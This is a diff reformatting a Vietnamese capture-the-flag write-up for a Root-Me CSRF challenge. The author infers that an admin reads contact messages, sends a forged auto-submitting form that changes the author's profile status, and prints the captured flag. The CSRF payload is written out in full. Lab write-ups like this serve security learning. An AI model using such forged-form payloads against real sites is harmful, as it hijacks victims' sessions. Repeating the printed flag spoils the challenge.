@@ -4,19 +4,19 @@
 
 Tạo tài khoản và login vào website:
 
-![Graphical user interface, application Description automatically generated](./media/image1.png){width="6.5in" height="2.2875in"}
+<img src="./media/image1.png" style="width:6.5in;height:2.2875in" alt="Graphical user interface, application Description automatically generated" />
 
 Ở tab Profile, khi ta thực hiện submit thử thì nhận được message:
 
-![Graphical user interface Description automatically generated with low confidence](./media/image2.png){width="3.733657042869641in" height="0.9250798337707786in"}
+<img src="./media/image2.png" style="width:3.73366in;height:0.92508in" alt="Graphical user interface Description automatically generated with low confidence" />
 
-Ở tab Contact, ta có thể thấy form với method="post", submit thử thì ta nhận được message:
+Ở tab Contact, ta có thể thấy form với method=“post”, submit thử thì ta nhận được message:
 
-![Graphical user interface, text, application, email Description automatically generated](./media/image3.png){width="4.531679790026247in" height="2.2594564741907264in"}
+<img src="./media/image3.png" style="width:4.53168in;height:2.25946in" alt="Graphical user interface, text, application, email Description automatically generated" />
 
 Qua tab Private, ta thấy message:
 
-![Graphical user interface, text, application Description automatically generated](./media/image4.png){width="5.342129265091864in" height="1.3167804024496939in"}
+<img src="./media/image4.png" style="width:5.34213in;height:1.31678in" alt="Graphical user interface, text, application Description automatically generated" />
 
 Từ đó, ta có thể đoán ra rằng, nội dung ở tab Contact sẽ được post lên và được admin kiểm duyệt Admin có thể click vào message của ta Có thể tấn công CSRF.
 
@@ -24,20 +24,20 @@ Từ đó, ta có thể đoán ra rằng, nội dung ở tab Contact sẽ đư�
 
 Qua tab Profile, inspect element và thực hiện giả mạo một form tương tự form ở tab Profile. Sau đó, chèn thêm script để admin có thể submit form:
 
-\<form id=\"clickme\" action=\"http://challenge01.root-me.org/web-client/ch22/?action=profile\" method=\"post\" enctype=\"multipart/form-data\"\>
+&lt;form id="clickme" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data"&gt;
 
-\<input type=\"text\" name=\"username\" value=\"19522445\"\>
+&lt;input type="text" name="username" value="19522445"&gt;
 
-\<input type=\"checkbox\" name=\"status\" checked\>
+&lt;input type="checkbox" name="status" checked&gt;
 
-\</form\>
+&lt;/form&gt;
 
-\<script\>document.getElementById(\"clickme\").submit();\</script\>
+&lt;script&gt;document.getElementById("clickme").submit();&lt;/script&gt;
 
-![Graphical user interface, text, application, email Description automatically generated](./media/image5.png){width="5.983851706036745in" height="3.141938976377953in"}
+<img src="./media/image5.png" style="width:5.98385in;height:3.14194in" alt="Graphical user interface, text, application, email Description automatically generated" />
 
 Submit để gửi contact đến admin và qua tab Private để kiểm tra kết quả. Sau hơn 1 phút, ta nhận được flag:
 
-![Graphical user interface, application Description automatically generated with medium confidence](./media/image6.png){width="5.9588495188101485in" height="1.841826334208224in"}
+<img src="./media/image6.png" style="width:5.95885in;height:1.84183in" alt="Graphical user interface, application Description automatically generated with medium confidence" />
 
-**Flag:** Csrf_Fr33style-L3v3l1!
+**Flag:** Csrf\_Fr33style-L3v3l1!
